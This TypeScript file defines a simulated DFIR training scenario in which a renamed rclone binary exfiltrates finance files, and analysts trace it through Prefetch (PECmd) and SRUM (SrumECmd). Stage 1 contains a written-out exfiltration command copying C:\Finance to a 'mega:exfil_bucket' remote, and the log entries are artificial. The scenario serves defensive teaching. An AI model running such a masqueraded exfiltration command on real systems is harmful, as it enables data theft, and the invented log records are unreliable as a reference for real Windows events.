import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-windows-prefetch-srum-network-execution-trace',
    title: 'NIST SP 800-86 & SANS DFIR — Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace',
    category: 'MALWARE',
    mitreId: 'T1041',
    description:
      'Grounded in SANS DFIR Windows Artifact Analysis, Microsoft System Resource Usage Monitor (SRUM) architecture, and NIST SP 800-86: when an attacker renames rclone.exe to svchost_upd.exe, runs it to exfiltrate data over HTTPS, and deletes the binary, Windows Prefetch (C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-<Hash>.pf) records the run count, last 8 execution timestamps, and every referenced file/directory, while C:\\Windows\\System32\\sru\\SRUDB.dat logs the exact Process SID, AppId, and BytesSent.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Masqueraded rclone (svchost_upd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SysMain / Prefetcher Engine', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Prefetch (*.pf MAM Compressed)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'PECmd & SrumECmd Forensics', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'SRUDB.dat (ESE Network Usage)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace',
        narration:
          'The attacker renames rclone.exe to C:\\ProgramData\\svchost_upd.exe and runs svchost_upd.exe copy C:\\Finance mega:exfil. For the first 10 seconds of process execution, the Windows kernel memory manager and SysMain (Superfetch) service monitor every DLL, configuration file, and directory touched by the process.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1036.005 - Masquerading: Match Legitimate Name or Location)',
        technicalCommands: [
          'C:\\ProgramData\\svchost_upd.exe copy C:\\Finance\\Q4_M_and_A mega:exfil_bucket --config C:\\ProgramData\\rclone.conf',
          'SysMain Service writes compressed MAM (0x04 0x4D 0x41 0x4D) Prefetch file after 10s trace window',
        ],
        defenseMitigation:
          'Ensure Prefetch is enabled on both Windows Workstations and Windows Servers (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 3) for high-fidelity DFIR execution artifacts.',
        logs: [
          {
            id: 'dfir-pf-1',
            timestamp: '01:12:04.330',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain (Writing SVCHOST_UPD.EXE-9A41C20F.pf)',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\svchost.exe | TargetFilename: C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf | HeaderMagic: 4D414D04 (MAM LZXPRESS Huffman Compressed)',
            parsedFields: {
              PrefetchFile: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              CompressionHeader: 'MAM\\x04 (LZXPRESS Huffman Win10/11)',
              TracedExecutable: 'C:\\ProgramData\\svchost_upd.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Prefetch (.pf) Run Count, Last 8 Execution Timestamps & Referenced File Handles (PECmd)',
        narration:
          'Decompressing and parsing SVCHOST_UPD.EXE-9A41C20F.pf with PECmd.exe reveals RunCount=2, the last 8 execution timestamps in UTC, Volume serial numbers, and the complete list of files opened during startup—including C:\\ProgramData\\rclone.conf and C:\\Finance\\Q4_M_and_A\\Merger_Terms.xlsx—proving the masqueraded binary was actually Rclone reading sensitive files.',
        activeNodes: ['target', 'siem', 'ad'],
        mitreTactic: 'Collection (T1005 - Data from Local System Proved via Prefetch File Metrics)',
        technicalCommands: [
          'PECmd.exe -f "C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf" --csv C:\\Forensics',
          'Prefetch Version: 30 (Win10/11) | RunCount: 2 | LastRun: 2026-11-03 01:11:54 UTC',
          'FilesReferenced: \\VOLUME{01d9...}\\PROGRAMDATA\\RCLONE.CONF, \\VOLUME{01d9...}\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX',
        ],
        defenseMitigation:
          'During incident response, parse all C:\\Windows\\Prefetch\\*.pf files with PECmd.exe and search the FilesReferenced array for staging archives (.7z, .rar), rclone.conf, or credential stores.',
        logs: [
          {
            id: 'dfir-pf-2',
            timestamp: '01:25:10.100',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 30,
            ProcessName: 'PECmd.exe',
            CommandLine: 'PECmd.exe -f C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
            raw: 'PREFETCH_PARSE: ExecutableName="SVCHOST_UPD.EXE" Hash="9A41C20F" RunCount=2 LastRun="2026-11-03 01:11:54"PreviousRun0="2026-11-03 01:08:12" FilesReferenced="C:\\PROGRAMDATA\\RCLONE.CONF; C:\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX"',
            parsedFields: {
              ArtifactPath: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              RunCount: '2',
              LastRunUtc: '2026-11-03 01:11:54',
              SmokingGunReference: 'C:\\PROGRAMDATA\\RCLONE.CONF & MERGER_TERMS.XLSX',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SRUM Database (SRUDB.dat) Network Data Usage Attribution ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
        narration:
          'To quantify the exact volume of data exfiltrated even after the binary was deleted and firewall logs rolled over, the analyst parses C:\\Windows\\System32\\sru\\SRUDB.dat (cross-referenced with the SOFTWARE hive for SruDbIdMapTable SIDs) using SrumECmd.exe. Table {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage Monitor) proves \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe transmitted 1,482,910,208 BytesSent under User SID S-1-5-21-...-1104.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel Quantified via SRUM)',
        technicalCommands: [
          'SrumECmd.exe -f "C:\\Windows\\System32\\sru\\SRUDB.dat" -r "C:\\Windows\\System32\\config\\SOFTWARE" --csv C:\\Forensics',
          'SRUM Table GUID: {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage)',
          'AppId: \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe | BytesSent: 1,482,910,208 (1.48 GB)',
        ],
        defenseMitigation:
          'Always acquire C:\\Windows\\System32\\sru\\SRUDB.dat alongside C:\\Windows\\System32\\config\\SOFTWARE during breach scoping to prove or disprove data exfiltration volumes per process and user SID.',
        logs: [
          {
            id: 'dfir-pf-3',
            timestamp: '01:30:00.400',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 973,
            ProcessName: 'SrumECmd.exe',
            CommandLine: 'SrumECmd.exe -f C:\\Windows\\System32\\sru\\SRUDB.dat -r C:\\Windows\\System32\\config\\SOFTWARE',
            raw: 'SRUM_NETWORK_USAGE: Table="{973F5D5C-1D90-4944-BE8E-24B94231A174}" Timestamp="2026-11-03 01:15:00" ExeInfo="\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe" UserSid="S-1-5-21-3819201-1104" BytesSent=1482910208 BytesRecvd=14209120',
            parsedFields: {
              ForensicDatabase: 'C:\\Windows\\System32\\sru\\SRUDB.dat',
              SrumTableGuid: '{973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Usage)',
              TrackedProcess: '\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe',
              ExfiltratedBytesSent: '1,482,910,208 bytes (1.48 GB)',
            },
          },
        ],
      },
    ],
  };
